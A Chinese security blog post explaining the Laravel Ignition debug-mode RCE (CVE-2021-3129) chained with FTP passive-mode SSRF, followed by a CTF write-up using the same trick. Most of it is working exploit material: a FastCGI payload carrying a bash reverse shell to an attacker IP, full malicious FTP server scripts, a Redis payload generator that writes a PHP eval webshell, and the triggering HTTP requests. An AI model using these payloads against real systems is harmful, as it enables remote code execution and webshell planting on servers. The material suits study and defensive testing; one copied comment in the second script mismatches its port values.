---
title: ftp被动模式eg
date: 2023-08-28 22:56:02
categories:
- 网络安全
tags:
- web 
description: |
    如题
---

## 活学活用

### Laravel Debug mode && FTP SSRF to RCE

Laravel 是一套简洁、开源的 PHP Web 开发框架，旨在实现 Web 软件的 MVC 架构。

2021 年 01 月 12 日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当 Laravel 开启了 Debug 模式时，由于 Laravel 自带的 Ignition 组件对 `file_get_contents()` 和 `file_put_contents()` 函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意 Log 文件等方式触发 Phar 反序列化，最终造成远程代码执行：

- vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php

![img](https://p1.ssl.qhimg.com/t01abad478292533a15.png)

该漏洞可以简化为以下两行：

```php
$contents = file_get_contents($parameters['viewFile']);
file_put_contents($parameters['viewFile'], $contents);
```

可以看到这里主要功能点是：读取一个给定的路径 `$parameters['viewFile']`，并替换读取到的内容中的 `$variableName` 为`$variableName ?? ''`，之后写回文件中 `$parameters['viewFile']`，这相当于什么都没有做！

该漏洞的预期利用方法是重写日志文件然后使用 `phar://` 协议去触发 Phar 反序列化并实现 RCE。但有时候由于某些原因，我们无法是通过该方法进行 RCE，这时候我们便可以考虑本篇文章所讲的知识点，利用 FTP SSRF 攻击内网应用，从而寻找 RCE 的办法。

由于我们可以运行 `file_get_contents` 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送 HTTP 请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。

众所周知，如果我们能向 PHP-FPM 服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与 `gopher://` 协议结合使用，curl支持 `gopher://` 协议，但 `file_get_contents` 和 `file_put_contents` 却不支持。

另一个已知的允许通过 TCP 发送二进制数据包的协议就是我们本文所讲的 FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从  FTP 服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的 IP  和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。

现在，由于该 laravel 漏洞中 `file_get_contents` 和 `file_put_contents` 这两个函数在作祟，如果我们尝试使用 `viewFile=ftp://evil-server/file.txt` 来利用这个漏洞，会发生以下情况：

- `file_get_contents` 连接到我们的FTP服务器，并下载 file.txt。
- `file_put_contents` 连接到我们的FTP服务器，并将其上传回 file.txt。

现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 `file_get_contents` 在我们的服务器上下载一个文件，当它试图使用 `file_put_contents` 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。

这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成 SSRF。

下面我们来演示一下攻击过程。

首先，我们使用gopherus生成攻击fastcgi的payload：

```bash
python gopherus.py --exploit fastcgi
/var/www/public/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/192.168.1.7/2333 0>&1"  # 这里输入的是要执行的命令
```

![img](https://p0.ssl.qhimg.com/t01a0a454a129453abf.png)

得到 payload，同样是只需要 payload 中 `_` 后面的数据部分，即：

```python
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

在攻击机上设置好监听：

![img](https://p0.ssl.qhimg.com/t01ac82d4ead6e14ceb.png)

然后编写如下脚本（[脚本是从网上扒的](https://github.com/Maskhe/evil_ftp)，谁叫我菜呢，大佬勿喷~~），在攻击机上搭建一个恶意的 ftp 服务，并将上面的 payload 中的数据替换掉下面 ftp 脚本中的 payload 的内容：

```python
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode
payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")  
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 192,168,1,7,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```

运行上述脚本，一个恶意ftp服务就起来了：

![img](https://p5.ssl.qhimg.com/t01ca2d58a2bb169e1b.png)

这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。

最后，构造如下请求，即可触发攻击并反弹 Shell：

```http
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.1.12:8000
Content-Type: application/json
Content-Length: 189

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "ftp://aaa@192.168.1.7:23/123"
  }
}
```

### [2021 羊城杯CTF]Cross The Side

进入题目，又是 Laravel：

![img](https://p0.ssl.qhimg.com/t01b842dcb0f7448899.png)

根据 Laravel 的版本猜测应该是 Laravel Debug mode RCE，但是尝试 Debug RCE  并没有成功，可能是日志文件太大的原因。然后端口扫描发现其本地 6379 端口上有一个 Redis，猜测本题应该是通过 FTP 被动模式打内网的  Redis。参照前面所讲的原理，直接打就行了。

首先生成攻击 Redis 的 Gophar Payload：

```python
import urllib
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n<?php eval($_POST[\"whoami\"]);?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""    # 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

生成的 payload 只取 `_` 后面的数据部分：

```python
%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

然后在攻击机上搭建一个恶意的 FTP 服务，并将上面的 Payload 中的数据替换掉下面 FTP 脚本中的 Payload 的内容：

```python
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode
payload = unquote("%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A")
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 2333))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 47,101,57,72,0,2333\n")  # 服务端告诉客户端需要到那个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,0,6379\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据链接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```

这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 Payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:6379，也就是目标主机上 Redis 服务的端口，从而造成 SSRF，攻击其 Redis。

运行 ftp_redirect.py：

![img](https://p0.ssl.qhimg.com/t010e57181bca5ddd9c.png)

然后发送请求就行了：

```python
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.41.107:8077
Content-Type: application/json
Content-Length: 190

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "ftp://aaa@47.101.57.72:23/123"
  }
}
```

![img](https://p2.ssl.qhimg.com/t01af779f700cb38433.png)

执行后，成功写入 Webshell，然后读取 flag 就行了：

![img](https://p1.ssl.qhimg.com/t0155c2eabe534cd30b.png)
